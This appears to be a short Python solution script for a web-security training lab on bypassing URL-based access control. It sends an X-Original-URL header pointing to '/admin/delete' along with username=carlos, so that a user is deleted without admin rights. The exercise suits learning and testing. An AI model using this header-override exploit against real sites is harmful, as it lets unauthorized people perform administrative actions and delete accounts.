#!/usr/bin/env python3
"""URL-based access control can be circumvented"""

from lab_04 import Lab


def main() -> None:
    """Entry point"""
    site = Lab()
    site.session.headers.update({"X-Original-URL": "/admin/delete"})
    payload = {"username": "carlos"}
    response = site.session.get(url=site.url + "/", params=payload)
    response.raise_for_status()


if __name__ == "__main__":
    main()
